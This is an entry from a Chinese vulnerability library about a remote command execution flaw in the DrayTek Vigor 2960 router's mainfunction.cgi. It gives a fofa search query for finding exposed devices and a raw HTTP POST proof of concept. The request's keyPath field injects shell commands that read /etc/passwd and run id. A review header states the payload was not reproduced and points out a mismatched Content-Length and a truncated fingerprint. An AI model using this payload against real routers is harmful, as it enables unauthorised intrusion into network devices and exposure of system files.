---
source: "wy876 漏洞文库"
id: "vw-f0abb77cfc4f0b3c5c1ecaf0"
entity_id: "ve-f0abb77cfc4f0b3c5c1ecaf0"
schema_version: "1"
fofa_unverified: "title="
title: "Draytek Vigor 2960 路由器mainfunction远程命令执行漏洞"
product: "DrayTek Vigor2960"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无固件，样例假登录字段"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/DrayTek/DraytekVigor2960%E8%B7%AF%E7%94%B1%E5%99%A8mainfunction%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lgi97gptaomg6blr"
source_status: "recorded"
---

# Draytek Vigor 2960 路由器mainfunction远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：DrayTek Vigor2960
- 本文讨论：mainfunction login/keyPath命令注入
- 版本、权限与配置前提：无固件，样例假登录字段
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 与76相同入口/机制，仅命令变化，缺CVE与版本
- fofa title=截断，Content-Length与请求体不一致；无结果
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 是否新版绕过/独立CVE需版本证据
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
DrayTek是中国台湾的一家网络设备制造商，其产品包括VPN路由器、管理型交换机、无线AP和管理系统等，并被中小型企业广泛使用。DrayTek路由器系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。

# 二、影响版本
+ Draytek Vigor 2960 路由器

# 三、资产测绘
+ fofa`title="Vigor 2960"`
+ 特征


# 四、漏洞复现
```http
POST /cgi-bin/mainfunction.cgi HTTP/1.1
Host: 
Connection: close
Content-Length: 94
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
Content-Type: text/plain; charset=UTF-8
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6

action=login&keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%26id%0A%27&loginUser=a&loginPwd=a
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lgi97gptaomg6blr>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
